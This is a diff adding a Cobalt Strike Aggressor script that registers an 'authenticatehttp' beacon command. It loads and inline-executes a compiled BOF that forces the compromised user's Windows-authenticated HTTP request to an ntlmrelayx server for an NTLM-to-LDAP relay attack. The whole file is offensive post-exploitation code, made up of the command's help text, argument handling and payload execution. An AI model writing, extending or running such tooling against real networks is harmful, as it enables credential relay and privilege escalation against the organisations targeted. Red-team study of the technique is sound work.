@@ -1,0 +1,40 @@
+# author Western Tactics
+
+beacon_command_register(
+	"authenticatehttp", "Force a Windows-auhtenticated HTTP request from the current user context.",
+	"INFO:\Force a Windows-auhtenticated HTTP request from current user context to a (ntlmrelayx) server for an authenticated (LDAP) relay attack. This tool must be run in a second beacon that is not running the SOCKS and rportfwd.\n\n" .
+	"ARGUMENTS:\n[<host>]: hostname or locahost to send the Windows authentication to\n[<port>]: port number to send the Windows autentication to.\n\n" .
+	"USAGE:\nauthenticatehttp <host> <port>\n\n" .
+	"EXAMPLES:\nauthenticatehttp localhost 8080\n\n");
+	
+alias authenticatehttp {
+    $bid = $1;
+    $host = $2;
+	$port = $3;
+
+    if ($host eq "") {
+        berror($bid, "Please specify \"localhost\" or the hostname to send the Windows authentication to\n");
+        return;
+    }
+	
+	if ($port eq "") {
+		berror($bid, "Please specify the port number to send the Windows authentication to\n");
+		return;
+	}
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("authenticatehttp.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "Zi", $host, $port);
+
+    blog($bid, "Sending Windows authenticated HTTP request..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+
+
